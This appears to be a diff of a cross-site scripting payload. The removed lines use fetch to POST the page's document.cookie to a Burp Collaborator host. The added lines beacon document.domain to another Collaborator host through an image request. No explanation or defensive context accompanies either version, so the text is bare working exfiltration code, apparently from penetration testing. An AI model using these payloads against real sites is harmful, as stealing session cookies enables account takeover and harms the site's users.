@@ -1,6 +1,2 @@
-fetch('https://ntks17v3x222kxd9nfk8nqdsnjt9hy.burpcollaborator.net', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
-
+var img=new Image() 
+img.src=`https://72781xzq7zaeailxipk68q9kzb51tq.burpcollaborator.net/?domain=${document.domain}`
